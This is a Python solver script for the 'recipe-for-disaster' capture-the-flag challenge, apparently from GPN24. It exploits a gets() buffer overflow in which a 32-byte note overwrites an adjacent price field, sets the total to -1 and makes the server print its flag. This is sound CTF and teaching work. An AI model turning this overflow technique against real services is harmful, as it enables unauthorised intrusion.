#!/usr/bin/env python3
"""
recipe-for-disaster solver — stdlib only (socket + ssl).

Bug: gets(cur->note) where note[32] is immediately followed by int price.
Win: verify_total() calls print_coupon() (reads /flag) when total < 0.

Payload: order 1 item, send 32 'A's + p32(-1) as note, then finish.
"""
import socket
import ssl
import struct
import sys

HOST = "grilled-brisket-infused-with-sauced-pesto-xqhx.gpn24.ctf.kitctf.de"
PORT = 443


def recv_until(sock, marker, timeout=10.0):
    sock.settimeout(timeout)
    buf = b""
    while marker not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def main():
    raw = socket.create_connection((HOST, PORT), timeout=10)
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(raw, server_hostname=HOST)

    payload = b"A" * 32 + struct.pack("<i", -1)

    # banner + first menu + prompt "Select item (1-6), or 0 to finish: "
    print(recv_until(sock, b"Select item").decode(errors="replace"), end="")
    sock.sendall(b"1\n")

    # "Any note for the chef? ... \n> "
    print(recv_until(sock, b"> ").decode(errors="replace"), end="")
    sock.sendall(payload + b"\n")

    # next menu + prompt
    print(recv_until(sock, b"Select item").decode(errors="replace"), end="")
    sock.sendall(b"0\n")

    sock.settimeout(5.0)
    rest = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            rest += chunk
    except (socket.timeout, ssl.SSLError):
        pass

    text = rest.decode(errors="replace")
    print(text)

    for line in text.splitlines():
        if "GPNCTF{" in line or "flag{" in line.lower():
            print(f"\n[+] FLAG: {line.strip()}", file=sys.stderr)


if __name__ == "__main__":
    main()
